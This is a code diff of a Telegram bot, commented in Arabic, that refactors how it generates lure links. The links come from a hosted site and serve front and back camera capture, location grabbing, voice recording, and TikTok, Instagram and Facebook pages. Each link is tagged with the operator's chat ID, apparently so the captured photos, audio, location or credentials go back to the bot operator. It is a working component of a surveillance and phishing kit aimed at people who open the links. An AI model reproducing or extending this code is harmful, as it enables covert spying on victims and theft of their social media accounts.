@@ -1855,99 +1855,98 @@ bot.on('callback_query', async (callbackQuery) => {
         return;  
     }  
 
-    async function fetchLink(baseUrl, keyword) {
+    
+
+// دالة لجلب رابط حسب اسم الملف داخل href
+async function fetchDynamicLink(baseUrl, keyword) {
     try {
         const response = await axios.get(baseUrl, { timeout: 10000 });
         const $ = cheerio.load(response.data);
 
-        let result = null;
+        let found = null;
 
         $('a[href]').each((i, el) => {
-            const href = $(el).attr('href');
-            if (!href) return;
+            let link = $(el).attr('href');
+            if (!link) return;
 
-            if (href.includes(`/${keyword}`)) {
-                if (href.startsWith('http')) {
-                    result = href;
-                } else {
-                    result = baseUrl + href;
-                }
+            // تحويل الروابط النسبية إلى كاملة
+            if (link.startsWith('/')) {
+                link = baseUrl.replace(/\/+$/, '') + link;
+            }
+
+            // البحث عن ملف بداخله keyword مثل /c أو /b أو /t أو /i
+            if (link.includes(`/${keyword}`)) {
+                found = link;
                 return false;
             }
         });
 
-        return result;
-    } catch (e) {
-        console.error(e);
+        return found;
+    } catch (err) {
+        console.error(err);
         return null;
     }
 }
-
 
 bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const action = callbackQuery.data;
 
+    // موقعك الذي تؤخذ منه الروابط
     const baseUrl = "https://sssssskskjwnsb-linklsksn.hf.space";
-    let link = '';
+
+    bot.sendMessage(chatId, "⏳ جاري جلب الرابط من الخادم...");
+
+    let keyword = null;
+    let finalLink = null;
 
     switch (action) {
-
-        case 'captureFront': {
-            const found = await fetchLink(baseUrl, 'c');
-            if (!found) return bot.sendMessage(chatId, "لم يتم العثور على رابط c");
-            link = `${found}?chatId=${chatId}`;
+        case 'captureFront':   // يبحث عن رابط فيه /c
+            keyword = 'c';
             break;
-        }
 
-        case 'captureBack': {
-            const found = await fetchLink(baseUrl, 'b');
-            if (!found) return bot.sendMessage(chatId, "لم يتم العثور على رابط b");
-            link = `${found}?chatId=${chatId}`;
+        case 'captureBack':    // يبحث عن رابط فيه /b
+            keyword = 'b';
             break;
-        }
 
-        case 'getLocation': {
-            const found = await fetchLink(baseUrl, 'getLocation');
-            if (!found) return bot.sendMessage(chatId, "لم يتم العثور على رابط getLocation");
-            link = `${found}/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+        case 'getLocation':    // هذا ثابت على السيرفر الأم
+            finalLink = `${baseUrl}/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
             break;
-        }
 
-        case 'recordVoice': {
-            const found = await fetchLink(baseUrl, 'record');
-            if (!found) return bot.sendMessage(chatId, "لم يتم العثور على رابط record");
+        case 'recordVoice':
             const duration = 10;
-            link = `${found}/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
+            finalLink = `${baseUrl}/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
             break;
-        }
 
-        case 'rshq_tiktok': {
-            const found = await fetchLink(baseUrl, 't');
-            if (!found) return bot.sendMessage(chatId, "لم يتم العثور على رابط tiktok");
-            link = `${found}?chatId=${chatId}&type=tiktok`;
+        case 'rshq_tiktok':    // يبحث عن رابط فيه /t
+            keyword = 't';
             break;
-        }
 
-        case 'rshq_instagram': {
-            const found = await fetchLink(baseUrl, 'n');
-            if (!found) return bot.sendMessage(chatId, "لم يتم العثور على رابط instagram");
-            link = `${found}?chatId=${chatId}`;
+        case 'rshq_instagram': // يبحث عن رابط فيه /i
+            keyword = 'i';
             break;
-        }
 
-        case 'rshq_facebook': {
-            const found = await fetchLink(baseUrl, 'n');
-            if (!found) return bot.sendMessage(chatId, "لم يتم العثور على رابط facebook");
-            link = `${found}?chatId=${chatId}`;
+        case 'rshq_facebook':  // يبحث عن رابط فيه /fe
+            keyword = 'fe';
             break;
-        }
 
         default:
-            return bot.sendMessage(chatId, "خيار غير معروف");
+            bot.sendMessage(chatId, "⚠️ خيار غير معروف");
+            return;
     }
 
-    bot.sendMessage(chatId, `تم إنشاء الرابط: ${link}`);
+    // إذا يحتاج استيراد من الموقع
+    if (keyword) {
+        const dynamic = await fetchDynamicLink(baseUrl, keyword);
+        if (dynamic) {
+            finalLink = `${dynamic}?chatId=${chatId}`;
+        } else {
+            bot.sendMessage(chatId, `❌ لم يتم العثور على رابط يحتوي ${keyword} في الموقع`);
+            return;
+        }
+    }
+
+    bot.sendMessage(chatId, `تم إنشاء الرابط:\n${finalLink}`);
     bot.answerCallbackQuery(callbackQuery.id);
 });
 bot.onText(/\/jjihigjoj/, (msg) => {
